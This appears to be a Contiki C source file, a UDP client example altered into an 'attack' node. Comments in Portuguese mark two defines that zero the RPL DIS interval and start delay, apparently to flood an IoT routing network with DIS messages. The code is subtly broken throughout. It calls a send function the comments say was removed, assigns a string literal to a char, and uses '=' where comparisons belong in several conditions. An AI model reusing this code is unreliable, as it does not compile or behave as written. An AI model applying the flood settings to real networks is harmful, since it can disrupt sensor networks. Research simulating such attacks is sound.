#include "contiki.h"
#include "lib/random.h"
#include "sys/ctimer.h"
#include "net/ip/uip.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ip/uip-udp-packet.h"
#ifdef WITH_COMPOWER
#include "powertrace.h"
#endif

#include <stdio.h>
#include <string.h>

#include "dev/serial-line.h"
#include "net/ipv6/uip-ds6-route.h"

#define UDP_CLIENT_PORT 1234
#define UDP_SERVER_PORT 4321

//inseri essa linha para efetuar o ataque
#define RPL_CONF_DIS_INTERVAL 0
#define RPL_CONF_DIS_START_DELAY 0

#define UDP_EXAMPLE_ID 100

#define DEBUG DEBUG_FULL
#include "net/ip/uip-debug.h"

#ifndef PERIOD
#define PERIOD 60
#endif

#define START_INTERVAL  (15 * CLOCK_SECOND)
#define SEND_INTERVAL   (PERIOD * CLOCK_SECOND)
#define SEND_TIME   (random_rand() % (SEND_INTERVAL))
#define MAX_PAYLOAD_LEN 30 //defino o tamanho do pacote
 
static struct uip_udp_conn *client_conn;
static uip_ipaddr_t server_ipaddr;

/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "UDP Cliene Attack Processo");
AUTOSTART_PROCESSES(&udp_client_process);
/*---------------------------------------------------------------------------*/
static int seq_id;
static int reply;

static void tcpip_handler(void) {
    char *str;

    if(uip_newdata()) {
        str = uip_appdata;
        str[uip_datalen()] = "\0";
        reply++;
        printf("DATA recv '%s' (s:%d, r:%d)\n", str, seq_id, reply);
    }
}
/*---------------------------------------------------------------------------*/

//removi o método que envia pacotes

/*---------------------------------------------------------------------------*/
static void print_local_addresses(void) {
    int i;
    uint8_t state;
    PRINTF("Client IPv6 addresses: ");
    for(i = 0; i < UIP_DS6_ADDR_NB; i++) {
        state = uip_ds6_if.addr_list[i].state;
        if(uip_ds6_if.addr_list[i].isused && 
            (state == ADDR_TENTATIVE || state == ADDR_PREFERRED)) {
            PRINT6ADDR(&uip_ds6_if.addr_list[i].ipaddr);
            PRINTF("\n");
            if(state == ADDR_TENTATIVE) {
                uip_ds6_if.addr_list[i].state = ADDR_PREFERRED;
            }    
        }
    }
}
/*---------------------------------------------------------------------------*/

static void set_global_address(void) {

    uip_ipaddr_t ipaddr;

    uip_ip6addr(&ipaddr, UIP_DS6_DEFAULT_PREFIX, 0, 0, 0, 0, 0, 0, 0);
    uip_ds6_set_addr_iid(&ipaddr, &uip_lladdr);
    uip_ds6_addr_add(&ipaddr, 0, ADDR_AUTOCONF);
#if 0
/* Mode 1 - 64 bits inline */
    uip_ip6addr(&server_ipaddr, UIP_DS6_DEFAULT_PREFIX, 0, 0, 0, 0, 0, 0, 0, 1);
#elif 1
/* Mode 2 - 16 bits inline */
    uip_ip6addr(&server_ipaddr, UIP_DS6_DEFAULT_PREFIX, 0, 0, 0, 0, 0x00ff, 0xfe00, 1);
#else
/* Mode 3 - derived from server link-local (MAC) address */
    uip_ip6addr(&server_ipaddr, UIP_DS6_DEFAULT_PREFIX, 0, 0, 0, 0x0250, 0xc2ff, 0xfea8, 0xcd1a);
#endif    
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(udp_client_process, ev, data) {
    static struct etimer periodic;
    static struct ctimer backoff_timer;

#if WITH_COMPOWER
    static int print = 0;
#endif

    PROCESS_BEGIN();

    PROCESS_PAUSE();

    set_global_address();

    PRINTF("UDP client process started nbr:%d routes:%d \n",
            NBR_TABLE_CONF_MAX_NEIGHBORS, UIP_CONF_MAX_ROUTES);
    
    print_local_addresses();

    /* new connection with remote host */
    client_conn = udp_new(NULL, UIP_HTONS(UDP_SERVER_PORT), NULL);
    if(client_conn = NULL) {
        PRINTF("No UDP connection available, exiting the process!");
        PROCESS_EXIT();
    }
    udp_bind(client_conn, UIP_HTONS(UDP_CLIENT_PORT));

    PRINTF("Created a connection with the server ");
    PRINT6ADDR(&client_conn->ripaddr);
    PRINTF(" local/remote port %u/%u\n",
            UIP_HTONS(client_conn->lport), UIP_HTONS(client_conn->rport));
    
#if WITH_COMPOWER
    powertrace_sniff(POWERTRACE_ON);
#endif

    etimer_set(&periodic, SEND_INTERVAL);
    while(1) {
        PROCESS_YIELD();
        if(ev = tcpip_event) {
            tcpip_handler();
        }

        if(ev = serial_line_event_message && data != NULL) {
            char *str;
            str = data;
            if(str[0] == 'r') {
                uip_ds6_route_t *r;
                uip_ipaddr_t *nexthop;
                uip_ds6_defrt_t *defrt;
                uip_ipaddr_t *ipaddr;
                defrt = NULL;
                if((ipaddr = uip_ds6_defrt_choose()) != NULL) {
                    defrt = uip_ds6_defrt_lookup(ipaddr);
                }
                if(defrt != NULL) {
                    PRINTF("DefRT: :: -> %02d", defrt->ipaddr.u8[15]);
                    PRINTF(" lt:%lu inf:%d\n", stimer_remaining(&defrt->lifetime), defrt->isinfinite);

                }
                else {
                    PRINTF("DefRT: :: -> NULL\n");
                }

                for(r = uip_ds6_route_head; r != NULL; r = uip_ds6_route_next(r)) {
                    nexthop = uip_ds6_route_nexthop(r);
                    PRINTF("Route: %02d -> %02d", r->ipaddr.u8[15], nexthop->u8[15]);
                    PRINTF(" lt:%lu\n", r->state.lifetime);
                }
            }
        }

        if(etimer_expired(&periodic)) {
            etimer_reset(&periodic);
            ctimer_set(&backoff_timer, SEND_TIME, send_packet, NULL);
#if WITH_COMPOWER
    if(print == 0) {
        powertrace_print("#P");
    }
    if(++print == 3) {
        print = 0;
    }
#endif
        }
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
